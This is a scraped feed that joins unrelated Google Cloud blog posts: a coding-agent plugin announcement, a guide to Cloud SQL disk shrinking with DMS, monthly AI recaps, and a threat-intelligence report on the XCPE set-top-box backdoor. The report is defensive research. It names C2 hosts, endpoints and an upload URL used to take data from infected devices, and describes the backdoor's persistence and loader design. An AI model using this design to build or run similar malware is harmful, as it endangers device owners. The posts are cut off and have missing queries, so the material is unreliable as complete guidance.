Remigiusz Samborski

Lead Developer Relations Engineer

Building cloud solutions with autonomous AI agents should feel fast, safe, and reliable. Without cloud-specific context, coding agents often struggle. They might invent deprecated SDK syntax, guess invalid command flags, or attempt operations without the required Identity and Access Management (IAM) permissions. Even worse, an unguided agent can enable billable APIs or provision cloud resources without your explicit permission.

Starting today, you can install the google-cloud-developer plugin directly from the Antigravity Marketplace in the 

Build with Google
section. This plugin equips Antigravity with foundational skills, safety guardrails, and live documentation grounding for building on Google Cloud. If you've never installed a plugin using the marketplace before, you can refer to the Antigravity documentation.

Configuration is straightforward. The bundled Developer Knowledge Model Context Protocol (MCP) server is pre-authorized by default. You don't need to configure API keys, exchange OAuth tokens, or edit any configuration files. You install the plugin, and your agent connects to official Google developer documentation immediately.

In this post, we'll walk through what's included in the plugin, how to install it with one click, and how it grounds your agent in live Google Cloud documentation.

Why use the Google Cloud Developer plugin?

Coding agents often rely on static training data. Cloud platforms update quickly, and models can produce code with outdated client libraries or invalid parameters.

The 

google-cloud-developer
plugin solves this issue. It bundles curated skills, intelligent routing rules, and the Developer Knowledge MCP server into a single portable package.

The plugin provides three key benefits:

  • Live documentation grounding: The agent queries official Google Cloud documentation over streamable HTTP.

  • Safety and cost guardrails: The agent enforces least-privilege IAM patterns and it requires your consent before it enables billable APIs or modifying cloud infrastructure.

  • Environment awareness: The agent inspects your local environment, detects existing CLI configurations, and designs safe execution roadmaps before it runs commands.

What's included in the plugin

The plugin pairs core baseline skills and live documentation grounding with an intelligent skill routing architecture. Rather than limiting your agent to a fixed set of capabilities, it acts as an extensible gateway that discovers and pulls specialized skills from Google on demand.

entries.content:
Nithin Tomson

Database Engineer

Adi Shtatfeld

Senior Product Manager

When database engineers hear “database migration", they typically think of a one-time onboarding pathway—moving databases from on-premises environments to the cloud, or between different cloud providers.

However, Google Cloud's Database Migration Service (DMS) supports Cloud SQL for SQL Server as a source. This opens up powerful, non-traditional operational patterns for SQL Server customers within Google Cloud. Because DMS enables continuous, low-downtime database replication between Cloud SQL instances—whether in the same project, across different projects, or across regions—it can serve as an everyday utility for day-two operations like storage management.

In this post, we explore a compelling operational use case for DMS with Cloud SQL for SQL Server: executing disk shrinks with minimal application downtime.

Why should I shrink my disk?

In many production environments, database storage only moves in one direction: up. Features like Cloud SQL automatic storage increase are essential for preventing out-of-space outages during unexpected traffic spikes, large batch imports, index maintenance, or temporary staging loads. Similarly, over the lifecycle of an application, you might archive historical records, purge obsolete data, or drop unused indexes.

When data is deleted, SQL Server marks the freed space inside your data files (.mdf, .ndf) as reusable for future writes; similarly, log truncation frees up space within transaction log files (.ldf). However, the database files themselves continue to hold their peak used space unless AUTO_SHRINK is configured — a setting that is generally not recommended in production due to severe index fragmentation and performance overhead.

With a manual shrink operation on the database files using DBCC SHRINKFILE, you can release that unused space from SQL Server files back to the underlying disk. Even after shrinking the database files, though, the Cloud SQL persistent disk remains at its peak allocated capacity. If you do not expect your database to grow back into that allocated disk space anytime soon, you should consider shrinking the disk itself to reduce ongoing storage costs — especially in scenarios such as:

After major data archiving or purging: You have permanently moved historical data to cold storage or BigQuery and your active dataset is now a fraction of its peak size.

Recovering from one-time storage spikes: A runaway transaction, large data migration, or temporary staging load triggered storage auto-increase, leaving you paying for terabytes of provisioned disk capacity you no longer need.

Post-refactoring or schema optimization: You have split tables out of a monolithic database into separate services, dropped large unused indexes, or applied data compression.

The query below allows you to inspect both the allocated capacity and available free space for each database file fo a database:

You can monitor the following key Cloud SQL metrics in Cloud Monitoring to identify whether your provisioned disk quota significantly exceeds actual disk usage, indicating an opportunity for disk shrinking:

  • database/disk/bytes_used
    : Tracks the actual amount of disk space currently consumed by your database files and logs. 

  • database/disk/quota
    : Represents the total provisioned disk capacity allocated to your instance.

Cloud SQL provides a built-in storage shrink feature to reclaim this unallocated disk space, which works well when your workload can tolerate a planned maintenance window. However, native disk shrinking requires instance downtime proportional to the total allocated disk size — which can mean hours of offline maintenance for multi-terabyte drives.

If your production SLAs cannot accommodate extended downtime, Database Migration Service (DMS) offers a minimal-downtime alternative. By continuously replicating your databases to a newly provisioned Cloud SQL instance with a smaller, right-sized disk, you can reclaim unused storage while your application stays online — requiring only a brief cutover window. To understand why this approach keeps your cutover window so short, let's first look at how DMS replicates data between Cloud SQL for SQL Server instances under the hood.

How DMS works under the hood: Replication between Cloud SQL for SQL Server instances

To leverage DMS effectively, it helps to understand its underlying replication mechanism. When migrating between Cloud SQL for SQL Server instances, DMS coordinates a synchronization process similar to native SQL Server log shipping.

  • Initial full backup: It captures an initial full backup (.bak) of the selected user databases and restores them on the target instance.

  • Continuous log backups: It continuously captures and applies transaction log backups (.trn) to keep the target instance synchronized in near-real time.

Because synchronization occurs at the user database level, objects residing outside of it—such as logins, linked servers, and SQL Server Agent jobs—are not automatically replicated to the standby instance. Consequently, server-level objects must be migrated manually.

Disk shrinking with minimal downtime

Using this continuous replication pipeline, you can reclaim unallocated storage without taking a lengthy maintenance window. Instead of shrinking the existing disk in place while the instance is offline, you migrate your workload to a newly provisioned Cloud SQL instance with a right-sized disk while your production application remains online.

The DMS disk shrink workflow

  • Provision a new target instance with a smaller, appropriately sized disk (leaving sufficient headroom for transaction logs and future data growth).

  • Start a continuous DMS job using your existing Cloud SQL instance as the source.

  • Let replication catch up while your production application runs uninterrupted.

  • Perform a brief cutover: Stop application traffic, let the final transaction log apply, promote the target instance in DMS, and repoint your application.

Comparison: Native shrink vs. DMS migration

As shown in the comparison above, because DMS migrates your workload to a new instance at the user-database level, a smooth cutover requires migrating your server-level objects and user mappings alongside your data. Let's look at the essential pre- and post-cutover steps to include in your runbook.

Pre and post-cutover essentials: Going beyond database replication

Pre-cutover preparation: Migrating server-level objects

Because DMS operates at the user-database level, server-level objects are not automatically replicated. You will need to create them manually in the destination instance before the cutover.

  • Script out logins from the source using 

    sp_help_revlogin
    and recreate them on the target instance.

  • SQL Server Agent jobs & Server-Level objects: Because DMS replicates databases rather than server instance state, objects outside user databases must be scripted from the source and deployed to the destination Cloud SQL instance. In SQL Server Management Studio (SSMS), connect to your source instance, navigate to the object in Object Explorer, right-click and select 

    Script [Object] as > CREATE To > New Query Window / File
    :
    • SQL Server Agent jobs (
      SQL Server Agent > Jobs
      ): Inspect generated scripts to ensure job steps do not reference on-premises file paths or unsupported OS dependencies.
    • Linked servers (
      Server Objects > Linked Servers
      ): Follow the exact same scripting approach. Ensure you enable the 
      cloudsql.linked_servers
      database flag on your Cloud SQL instance before deploying.
    • Extended events (
      Management > Extended Events > Sessions
      ): Follow the same scripting approach. 

  • For TDE enabled instances, you will need to export the TDE certificate from source and import the TDE certificate to destination before. 

  • Instance Configurations (such as database flags, Active Directory, Entra ID configurations etc): These must be manually configured on the destination instance to exactly match the source settings.

  • If using Polybase you will need to re-encrypt DMK for the database-scoped credentials to function correctly.

Post-cutover remediation: Resolving orphaned database users

Database users mapped to SQL Server logins that are either absent or misconfigured on a server instance are unable to authenticate. These are termed orphaned users. Because logins created on the destination instance will possess unique Security Identifiers (SIDs) that do not match the source SIDs preserved in your migrated databases, users will be orphaned by default. Addressing this requires manual re-mapping once the target database is brought online following the cutover.

  • Detecting & re-mapping orphaned users: While using sp_help_revlogin preserves SIDs during login migration, creating logins on the destination instance via alternative methods generates new server-level SIDs. Because these differ from the source SIDs retained in the DMS-restored user databases, database users become orphaned after cutover and require re-mapping.

ALTER USER
): For each unlinked database user returned by the query, execute the following statement inside the context of that database to cleanly re-map the principal and its permissions to the new Cloud SQL server login:

Summary and next steps

DMS is more than a one-time bridge from on-premises environments into Google Cloud — it is a versatile tool for day-two operations in the Cloud SQL engineer's toolkit. When strict production SLAs prevent you from taking lengthy maintenance windows for a native disk shrink, DMS provides a reliable, managed replication pipeline to right-size your storage footprint and reduce infrastructure costs with minimal downtime.

To get started with configuring Cloud SQL for SQL Server as a DMS source, explore the official documentation. And if you're new to running SQL Server on Google Cloud, check out the Cloud SQL for SQL Server introduction.

entries.content:
Andrea Morange

Editor, Google Cloud

Editor’s note: Want to keep up with the latest from Google Cloud? Check back here for a monthly recap of our latest updates, announcements, resources, events, learning opportunities, and more.

This October, we took massive leaps forward in delivering flexible, open, and powerful enterprise AI solutions. From bringing Gemini 4 Argon to Google Cloud to expanding choice and flexibility, we’re giving organizations the tools they need to bring complex, multi-agent AI workflows into production safely.

Here’s a quick look at the major milestones, expert insights, and practical developer guides to read through and save.

Top announcements

  • Gemini 4 Argon available on Google Cloud, built to help solve your business’ hardest problems: We trained Argon to work with both depth and precision, which allows it to maintain context across long, multi-step tasks which are reinforced with strong domain expertise along the way. Whether your team is running complex software builds, handling detailed financial and legal work, or deploying cybersecurity tools like CodeMender, Argon helps your teams maintain focus from start to finish. 

  • Expanding Claude availability and deployment choice on Google Cloud: We announced the general availability of an Anthropic-managed deployment option for Claude Models on Google Cloud. This gives teams more choice in how they run their models, helping them consolidate AI workloads on Google Cloud alongside our existingGoogle-managed deployment option. 

  • Google Cloud expands model choice and flexibility, bringing OpenAI models to customers: Google Cloud is now the only hyperscale cloud provider offering access to all three leading closed source LLMs, alongside more than 200 first-party, third-party, and open models on a unified enterprise AI platform. 

  • Claude Opus 5.5 and Claude Sonnet 5.5 are now available in Google Antigravity: In keeping with Google Cloud's commitment to an open ecosystem and to give developers the right model for every job, Claude Opus 5.5 and Claude Sonnet 5.5 are now available in Google Antigravity for Google Cloud customers. Claude Opus 5.5 is built for complex work while Claude Sonnet 5.5 is a faster, lower-cost complement.

  • Introducing Gemini for government services: Today we're bringing the Gemini agent to public service with Gemini for government services in preview, part of our new suite of purpose-built industry solutions. It adds skills built around government work, connections to the systems agencies already run, and specialized partner agents, with governance running underneath it all. 

  • Gemini Robotics Embodied Reasoning 2 is now available on Google Cloud: For the first time, organizations can pair Google DeepMind’s latest embodied reasoning model for robotics with the enterprise-grade security, multi-agent orchestration, and end-to-end lifecycle management of Google Cloud — making it easier to simulate, evaluate, and deploy safe, adaptive physical AI at scale.

Thought leadership (editor’s pick)

  • A new gear: How startups are advancing robotics with Google AI: We marked a major milestone in physical AI with the launch of Gemini Robotics Embodied Reasoning 2 (ER 2) on the Gemini platform and AI Studio, bringing Google DeepMind’s frontier multimodal reasoning and long-horizon task planning for robotics to Google Cloud. Read more from Darren Mowry, VP of Global Startups and Investor Ecosystem at Google, about the exciting work these startups are undertaking. 

News you can use

  • Developer’s guide to implementing MCP apps in Gemini: Enterprise assistants still respond mostly in text. However, that can break down for visual, multi-step work, where every adjustment costs another slow chat turn. This guide takes you through implementation in Gemini. 

  • Four evaluation engineering lessons learned from building agent plugins: Here are four eval lessons we learned from building the new plugin that you can apply to your own builds. 

  • Who judges the judge? Three helpful ways to audit your LLM evaluators: In this post, we explore what’s holding enterprises back from strong evals, and share an easy three-pillar method you can use to improve your quality. 

Stay tuned for monthly updates on Google Cloud’s AI announcements, news, and best practices. For a deeper dive into the latest from Google Cloud customers, read our monthly recap, Cool stuff customers built.

September

This September, we brought you new how-to guides, model updates, and security innovations to help you find-and-fix. From Gemini 3.8 Live with Live Avatar to Mantis, there’s no shortage of new ways to apply AI to your work.

Notably, we announced Gemini 4 Argon, our next era of frontier intelligence. Gemini 4 Argon delivers frontier performance in complex workflows across real-world software engineering, enterprise knowledge work like legal and finance, and cybersecurity defense. You can learn more here. 

Top announcements

  • Gemini 3.8 Live with Live Avatar is now generally available: Following our announcement of Gemini 3.8 Live and Gemini 3.8 Live Extended Thinking, Gemini 3.8 Live with Live Avatar is now generally available in Gemini Enterprise.

  • Getting started with Mantis, our open-source bug finding-and-fixing harness: Available to all as an open-source framework, Mantis is part of Google’s internal approach to find and fix vulnerabilities at machine-speed. It creates a more effective scalable, context-aware repository analysis. 

Thought leadership (editor’s pick)

  • Racers, start your agents: Formula E brings realtime AI to the edge: Chasing records at the Goodwood Hillclimb, Formula E used Gemini Enterprise, Gemma, and a Pixel phone bolted to the dash to push the envelope of AI and edge computing.

News you can use

Best practices guide for customizing Gemini models via Reinforcement Learning (RL): In this guide, we will walk through practical best practices for using RL fine-tuning service. We'll start with a short tour of the RL training loop, how to decide if and when to use RL, and introduce how to get the most value from this approach.

Empower your agents with the Google Cloud CLI remote MCP server: Powered by the popular gcloud and bq (BigQuery) command-line tools, this new server gives AI agents immediate, broad access to command-line operations for managing Google Cloud infrastructure and working with advanced BigQuery workflows securely and seamlessly. 

Graph Workflows in ADK: Everything you need to know: Using a refund workflow in ADK, we'll cover fan-out and fan-in, deterministic and agent routers, human-in-the-loop pauses, parallel workers, and dynamic orchestration— along with when to use a static graph or let Python decide what runs next.

Stay tuned for monthly updates on Google Cloud’s AI announcements, news, and best practices. For a deeper dive into the latest from Google Cloud customers, read our monthly recap, Cool stuff customers built.

August

This month, we focused on making AI highly practical for your business, including its associated costs. This meant tailoring our models for specialized industries – starting with Financial Services and Legal – and helping you keep your budgets under control. Let’s dive in!

Top announcements

  • FinOps for the AI era: New flexible billing and cost controls for agents: To help you get better return on AI, we announced expanded billing flexibility and new cost management tools for agent workloads across Gemini Enterprise and developer tools like Google Antigravity in Gemini Enterprise and Android Studio. 

  • Gemini Enterprise for Financial Services: We’re bringing Google’s agentic AI directly into the workflows of capital markets and corporate banking.

  • Gemini Enterprise for Legal: Gemini Enterprise for Legal provides an integrated, fully governed environment configured for rapid deployment across firms and corporate legal departments. 

  • Expanding Google Antigravity for enterprise customers: Antigravity is available now as part of eligible Gemini Enterprise app subscriptions, including out-of-the-box administrative and spend controls.

Thought leadership (editor’s pick):

  • Tokenomics: Why smart teams spend more on AI, on purpose: Hear from Eric Lam, Head of Value, Delta, Google Cloud Consulting about how disciplined organizations are moving past reactive sticker shock over AI bills and embracing tokenomics. 

  • Meet the researcher fighting AI hallucinations at Google Cloud: Cyrus is a senior research scientist at Google. Lately, his focus has shifted to large language models, specifically a persistent issue known as hallucination, which is when an artificial intelligence model lacks the correct facts but confidently invents an answer anyway.

  • What sports cars can teach us about optimizing AI spend: More tokens doesn't always mean better AI. Read our conversation with Mike Clark, Director of Product Management for Gemini Enterprise Agent Platform, on how to balance horsepower with efficiency and get the highest return out of every dollar you spend on AI.

News you can use:

Looking for a steer on your foundation or inspiration for your next project? Take a look at some of our favorite how-to guides from August:

  • 10 questions every startup should answer before moving to production with their AI prototype: These ten are scoped to the prototype-to-production transition itself. Each question ends with a short, runnable snippet you can copy into your own project today. Adjacent decisions that matter just as much but aren't specific to that move, your data layer and RAG architecture, CI/CD, network design, are deliberately out of frame here.

  • Your chance to start building AI agents from the absolute basics: Agent Valley is a free, 5-week live learning series designed to take you from scratch to building your very own hands-on agent systems. And instead of staring at boring terminal lines, you’ll be building and playing inside a tiny, low-poly virtual world!

Stay tuned for monthly updates on Google Cloud’s AI announcements, news, and best practices. For a deeper dive into the latest from Google Cloud customers, read our monthly recap, Cool stuff customers built.

July

Since launching the Gemini Enterprise Agent Platform a few months ago, we’ve watched businesses move from basic experiments to serious, production-grade builds. We want to make it even easier — and more secure — for you to scale those systems.

Along with a batch of new platform updates, this month we’ve put together 13 practical demos and 20 diagnostic questions to help your engineering teams align on a strong architectural blueprint. Let’s dive in!

Top announcements

  • What’s new in Gemini Enterprise Agent Platform: In this helpful recap, we announced some of our most popular capabilities are available for everyone, from Agent Runtime to Agent Identity.

  • Now in preview: Find and fix software vulnerabilities with CodeMender: As adversarial AI threats accelerate attacks on code, security teams must counter them with machine-speed defenses that can automate code remediation and fight AI with AI. You can learn more about CodeMender and review the documentation here.

  • Solve harder problems with AlphaEvolve, now available to everyone on Google Cloud: AlphaEvolve is a code optimization and discovery agent built on top of Gemini that helps solve the hardest algorithmic problems and achieve breakthroughs for your business and research. 

Thought leadership (editor’s pick):

If automation requires delegation, then delegation requires trust. But letting an AI agent run on its own is a big leap for any business. While the productivity gains are clear, the fear of losing control is very real. This month, we sat down with our experts to discuss how leaders can navigate this shift by focusing on transparency, predictability, and setting clear boundaries for how agents handle weird data exceptions.

Here’s our picks for the month to learn more.

  • How leaders can scale AI by trading control for trust (Q&A): We sat down with Michael Gerstenhaber, VP of Product Management for Gemini Enterprise, to discuss why the future of AI is about defining safe boundaries.

  • What makes an AI agent trustworthy: Context is fast becoming one of the most valuable assets a company owns. Prajakta Damle, Senior Director, Product Management, shares what it takes to get trustworthy AI right. 

News you can use:

What if you’re looking for a steer on your basic foundation, inspiration for recipes, or some inspiration? Take a look at some of our favorite how-to guides from July:

  • Automate your agent development lifecycle using any coding agent: Stuck prototyping? With Agents CLI skills, you can go through the different phases of the entire agent lifecycle without ever leaving your coding agent.

  • Why AI apps fail in production (And how Google solved it): Only 5% of AI prototypes make it to production, and the other 95% fall into the validation abyss. How can you move confidently into production? 

  • 13 hands-on demos to build on Gemini Enterprise Agent Platform: Not sure where to start with Agent Platform? Here’s 13 ways you can stir up some creativity. 

Stay tuned for monthly updates on Google Cloud’s AI announcements, news, and best practices. For a deeper dive into the latest from Google Cloud customers, read our monthly recap, Cool stuff customers built.

June

Our main focus in June was helping your teams build, scale, and secure AI. Today, we’re sharing a fresh roundup of updates designed to help you run smarter, more secure applications while keeping everything under your control.

We even shared a cool virtual shopping demo at Cannes to show how retailers can make product discovery more exciting. Let’s dive in!

Top announcements

  • Introducing the Open Knowledge Format: We introduced the Open Knowledge Format (OKF), an open specification that formalizes the LLM-wiki pattern into a portable, interoperable format. This is a vendor-neutral, agent- and human-friendly standard for representing the metadata, context, and curated knowledge that modern AI systems need.

  • Collaboration with Apple on its expanded Private Cloud Compute (PCC) systems: Our collaboration with Apple is built on a foundation of deep commitment to privacy that leverages Google Cloud's security and privacy technologies. At the heart of this collaboration is our Confidential Computing portfolio and our Titanium security architecture.

  • Claude Fable 5: Available on Google Cloud: Claude Fable 5, Anthropic’s latest frontier model, is now generally available on Google Cloud. This launch is the latest proof point of our ongoing commitment to bring the industry's latest models straight to our Agent Platform. 

  • Cloud Atelier: How Gemini Enterprise is helping restyle the retail playbook: This year at Cannes, we showcased Cloud Atelier — a destination-based, virtual shopping experience that highlights how retail brands can turn this classic dilemma into an exciting moment of product discovery. 

Thought leadership (editor’s pick):

  • How Google Cloud Security uses AI internally: To counter machine-speed, AI-driven threats, we’ve worked hard to transition Google Cloud’s security posture to an autonomous, proactive model. By embedding specialized AI agents directly into our software development lifecycle (SDLC), we’ve created automated guardrails that protect code at a scale and speed unreachable by human teams — and we’re taking steps to make those same guardrails widely available.

  • The 4 lessons that guided AI Threat Defense: We introduced Chris Betz as the new CISO of Google Cloud. For his first Cloud CISO Perspectives, Chris shares four key lessons we learned about using AI to the defender’s advantage while building AI Threat Defense.

News you can use:

  • 5 lessons from red teaming AI applications: To help you build AI securely, Mandiant has developed a proactive, risk-based approach centered on the Good AI Assessment (GAIA) Top 10, outlined in our new report, Secure Development of Generative AI Applications: A Proactive Approach. 

  • How to unlock true ROI in software development – a deep dive into the latest DORA research: To help you evaluate the costs and business benefits of AI, we recently shared the DORA: ROI of AI-assisted software development report. This research offers a practical approach to help your team work through early adoption challenges, align engineering plans, and drive business growth.

  • Agent Factory Recap: 100X engineering with AI agents in Google Antigravity 2.0: In this episode of the Agent Factory, Shir Meir Lador, Head of AI Engineering, Google Cloud Developer Relations, sat down with Rody Davis, one of Google’s top agentic engineers. They dive into the massive shift from traditional IDEs to agent-first platforms, the reality of code reviews in an AI-driven world, and how to use "skills" to perform at a 100X level.

Stay tuned for monthly updates on Google Cloud’s AI announcements, news, and best practices. For a deeper dive into the latest from Google Cloud customers, read our monthly recap, Cool stuff customers built.

May

We’ve had a busy month! Between announcing Gemini Spark and Gemini 3.5 at Google I/O – and unveiling Google AI Threat Defense, our latest AI-powered cybersecurity solution, we had a lot to share with Google Cloud customers. Keeping up with the latest news takes time, so we gathered the most important announcements, thought leadership, and technical guides in one place to help you quickly catch up.

To learn more about our I/O announcements, here’s everything you need to know for Google Cloud customers, and top news for startups.

Top announcements

Introducing Google AI Threat Defense to help you outpace the adversary: Google Cloud is introducing a comprehensive AI-powered cybersecurity solution — Google AI Threat Defense — an always-on autonomous security platform. Learn more here.

  • Gemini 3.5: Our latest family of models combines frontier intelligence with action – starting with Gemini 3.5 Flash.

  • Gemini Omni: Our new model is a leap forward in world understanding, multimodality, and editing, letting you generate any output from any input, starting with video.

  • Google Antigravity: Google Antigravity’s expanded capabilities and new integration with Agent Platform bring agentic development to your entire organization.

  • Gemini Spark: For Gemini Enterprise and Workspace customers, Gemini Spark is your 24/7 personal AI agent that helps you work more efficiently by autonomously taking action on your behalf, under your direction.

  • Google Workspace: Google Pics, our new image generation and editing tool, and new voice features in Gmail, Docs and Keep, help reimagine how you work.

  • Managed Agents API on Agent Platform: Allows developers to build and run custom agents inside secure, Google-hosted environments that seamlessly integrate with Agent Platform.

  • CodeMender: A powerful AI security agent provided through Agent Platform, CodeMender can help find and fix vulnerabilities in your code.

Nano Banana 2 and Nano Banana Pro are generally available: Available today via Gemini Enterprise Agent Platform, organizations are already putting the models to work. Learn more here. 

Thought leadership (editor’s pick):

  • Cloud CISO Perspectives: How Google + Wiz changes multicloud strategy for CISOs: Vinod D’Souza, director, Office of the CISO, shares highlights from his RSA Conference fireside chat with Anthony Belfiore, chief strategy officer, Wiz. While threat actors have seen gains from the adversarial misuse of AI, Google and Wiz are tackling these challenges head-on by combining Wiz's deep cloud telemetry with Google's world-class AI and quantum research to help CISOs and their organizations meet the needs of the agentic enterprise era. Read more here.

We used to have to learn the language of computers. In 2026, they’re learning ours.

We kicked off the year by exploring the future of agentic commerce, where AI agents navigate the web to find and buy products for us. Our leaders call this the "invisible shelf" — a world where commerce isn't tied to a specific website. To make this reality scalable, we announced the Universal Commerce Protocol (UCP), a shared language that allows agents and retailers to understand each other. 

We brought that same fluency to our creative and technical tools:

  • Updates to Veo 3.1 allow creators to use simple inputs — like reference images — to generate precise, mobile-ready video.

  • Natural language queries: With Comments to SQL in BigQuery, we’re removing the language barrier to data. Engineers can now write queries by describing their intent in natural language, prioritizing the question over the code.

1. Gemini Enterprise for Customer Experience (CX): Specifically built for agentic retail, this platform transforms fragmented search, commerce and service touch points into one seamless journey — whether you need a shopping assistant, a support bot, agentic search or help with merchandising.

UCP establishes a common language for agents and systems to operate together across consumer surfaces, businesses and payment providers. So instead of requiring unique connections for every individual agent, UCP enables all agents to interact easily. UCP is built to work across verticals and is compatible with existing industry protocols like Agent2Agent (A2A), Agent Payments Protocol (AP2) and Model Context Protocol (MCP).

  • State-of-the-art upscaling to 1080p and 4K resolution 1 for high-fidelity production workflows.

These updates are launching in the Gemini app, YouTube, Flow, Google Vids, the Gemini API and Vertex AI.

4. Vibe querying with comments-to-SQL: Crafting complex SQL queries can be challenging. Often, engineers simply want to express their data needs in plain English directly within their SQL workflow. That’s why we’re introducing Comments to SQL in BigQuery. This feature makes writing queries using natural language – ‘vibe querying’ – a reality. Learn more in the blog.

entries.summary: Introduction Last week, Google and industry partners dismantled the XCPE backdoor which enrolled more than 1.3 million set-top boxes into a botnet. entries.content:
Google Threat Intelligence Group
Google Threat Intelligence

Visibility and context on the threats that matter most.

Contact Us & Get a Demo

Introduction

Last week, Google and industry partners dismantled the XCPE backdoor which enrolled more than 1.3 million set-top boxes into a botnet. We assess with high confidence that the backdoor and botnet were intentionally developed, deployed, and operated for financial gain by Videostrong Technology Co., an Android Original Equipment Manufacturer (OEM) and Original Design Manufacturer (ODM).

Videostrong monetized the backdoor by selling access to criminal affiliates and loading those affiliates’ malware modules onto infected devices. These secondary modules were conducting ad-fraud; silently enrolling infected devices into residential proxy networks; and loading additional malware onto XCPE-compromised devices. We also took action to disrupt the command and control (C2) domains that operate these affiliate modules. Because these affiliates each have diversified distribution channels for their modules beyond XCPE, we assess that taking down their C2 domains will sever access to at least 10 million additional compromised devices.

We found this malicious software built directly into many different device models and brands over multiple years, supported by dedicated infrastructure and constantly evolving configurations to evade detection and manage their affiliates. We believe this campaign wasn’t an isolated rogue insider or a development oversight. As a result, Google has cut ties with Videostrong and banned them from making devices with preloaded Google apps.

Google requires OEMs go through a comprehensive suite of compatibility and security tests to ensure a consistent and safe user experience across the Android ecosystem. However, Videostrong employed obfuscation techniques to exploit a gap in our tests and load malicious code after the device's first boot. As a result, Google has implemented changes to its existing review process to better safeguard against similar activity in the future. A device manufacturer intentionally infecting their users with malware is an unacceptable breach of trust, and represents a serious risk to those users. Without users’ knowledge or consent, infected devices were offered as a distribution mechanism for a wide array of criminal actors. This led to a variety of malicious activities being conducted on and through the devices, including ad-fraud, data exfiltration, and routing malicious network traffic through the devices.

We worked closely with Japan’s National Police Agency, Lumen, HUMAN Security, Plume, Synthient, and TrendAI to analyze this malware ecosystem and disrupt its operations.

While we expect this disruption to have a significant effect on these criminal operations, this is not the end of our work combatting malicious activity. Backdoor operators, ad-fraud rings, and residential proxy providers operate as an interconnected supply chain. Point-in-time disruptions are a critical tool to protect our users, but lasting disruption in this fluid ecosystem will require continued targeting of this infrastructure.

Google undertook the following actions to support disruption of the XCPE botnet:

  • Legal action to take down the domains and servers Videostrong used to control the botnet and install malware modules

  • Legal action to take down C2 domains used by over a dozen malware families loaded as modules via this backdoor

  • Banned Videostrong and any future subsidiaries or affiliates from building and selling certified Android devices in the future, or supplying software to other certified vendors

  • Implementing improvements to how we ensure the integrity of firmware on certified Android TV devices

Overview

The x.cpe network was built for ongoing profit. By giving malware affiliates backdoor access, the operators conspired to monetize these devices long after purchase.

Figure 1: XCPE malware overview

Malware

Since at least late 2024, Videostrong has evolved its pre-installed malware from simple single-stage droppers into a modular, three-stage architecture designed for resilience and multi-tenant monetization:

  • Primary Backdoor: Operating at the 

    android.uid.system
    privilege level, 
    x.cpe
    (running as 
    com.oemservice
    in some builds) is preloaded in the firmware partition. If uninstalled by a user, it automatically reinstalls from the 
    /oem/
    partition upon reboot, maintaining persistent system-level access. Its main function is to establish and facilitate communications between the C2 server and the loader and execution engine. 

  • Loader and Execution Engine: To evade security scans, 

    x.cpe
    acts primarily as the C2 communicator and offloads module execution to an external loader, 
    com.abc.nexus
    . This file employs native anti-analysis utilities to thwart sandbox detection, and configures and initializes the monetization modules. Most recently, 
    com.abc.nexus
    has itself been phased out in favor of using more tailored dropper malware that loads and executes single modules.

  • Monetization Modules: Videostrong monetizes its backdoored devices by loading monetization modules which are developed by entities other than Videostrong that act as affiliates. These modules are deployed as native ELF daemons, embedded SDKs compiled directly into the 

    com.abc.nexus
    DEX bytecode, or are fetched as secondary APKs from the malware staging infrastructure.  The loaded modules transform infected devices into residential proxy exit nodes (e.g., Linkfog, AppSalt, NetNut), ad-fraud engines (e.g., CBOXTV, HiddenView), or execute additional backdoors that load even more monetization modules (e.g. Moyu, Spirit).

Infrastructure

  • Command and Control: The botnet uses a two-stage C2 process. It first initiates HTTP POST requests to fetch dynamic configuration settings, geolocation data, and STUN server parameters. It then establishes a persistent, real-time Message Queuing Telemetry Transport (MQTT) connection to receive instructions for silent app installations, arbitrary shell commands, screen captures, and network reconnaissance. MQTT is a lightweight, publish-and-subscribe network protocol designed for low-bandwidth, high-latency, or unreliable remote networks.

  • Malware staging infrastructure: Additional monetization modules as well as various shell scripts and legitimate applications are hosted remotely and downloaded by infected devices upon command from the operator via the MQTT broker. A significant majority of these files are hosted as Github releases on operator-owned Github pages. Other files are hosted on operator-controlled servers and file hosting sites.

Malware Deep Dive

Backdoor Initialization

The infection chain begins with a stub package (called 

x.cpe
in some builds and 
com.oemservice
in others) preloaded in the system partition of the firmware and running at the 
android.uid.system
privilege level. This stub has limited functionality. Upon boot, it checks the device's 
oem/
directory for the corresponding 
x.cpe
package and initiates installation into the 
/data/app/
directory as outlined below. 

To maintain inter-process state across the firmware ecosystem, 

x.cpe
exports two ContentProviders, which expose structured configuration tables storing runtime parameters, device identifiers, proxy configuration blobs, and execution flags accessible by co-installed system applications. This enables other apps in Videostrong’s ecosystem, such as their YokaTV Player streaming software, to fetch configuration parameters provided by the C2 server mentioned below. 

C2 Configuration

The malware utilizes a two-stage communications protocol. It first fetches initial bootstrap configurations via an HTTP request, followed by a persistent MQTT subscription to receive commands and module download instructions.

To dynamically derive the HTTP C2 bootstrap server, it follows the following routine:

  • Queries 

    content://com.release.debug.provider/configs
    for 
    private_url
    via 
    x.cpe.util.ExtraReadUtils
    . 

  • Queries the Android system property to determine if 

    ro.mecool.device
    is true.

  • If true, it defaults to 

    http://mcstb.anyevonline.com:8000
     

  • If false, it dynamically generates the following: 

    http://stb[AndroidVersion][Type].anyevonline.com:8000
    .

Using the selected hostname, the client makes an HTTP POST request with an AES-encrypted JSON object containing hardware telemetry (SN, MAC, model, firmware version) to the following endpoints:

  • /router/config/mqtt: This endpoint provides MQTT broker details (including Broker Hostname, TCP Port, Authentication Tokens/Passwords, and the specific Topic structure: 

    /device/{model}/{chipId}/{action}
    . After receiving this data, the device initiates a persistent, real-time socket connection to the MQTT broker.

  • /router/config/acs: This endpoint response returns URLs for 

    ip-api[.]com
      and a Google STUN server to enable the malware to identify geolocation and public IP and port mapping to traverse network address translation (NAT) boundaries. It also returns a URL (
    http://ott.szbboys[.]com:8000/cpe/file/upload
    for uploading files, logs, or diagnostic dumps from the device, and returns flags to configure ad modules (
    adBwmActive
    , 
    adDevourUse
    , 
    adDevourCode
    ), and to enable or disable core malware modules.
  • /router/config/app: This endpoint provides module-level configs, including server mappings and parameters, which 
    x.cpe
    decrypts and passes to a SQLite 
    ContentProvider
    named 
    ShareProvider
    (
    com.oem.share.provider
    ). By exposing this inter-process data interface, 
    x.cpe
    enables modules to retrieve up-to-date upstream infrastructure parameters (such as URLs for additional configs, user manuals, etc).

MQTT Capabilities

Following initial configuration, persistent real-time C2 communication is managed by the MQTT library (

x.cpe.mqtt.MqttUtils
). All identified samples analyzed to date utilize a single broker hostname, 
mqtt.szbboys[.]com
. 

Specific MQTT topics are mapped to specific actions, including:

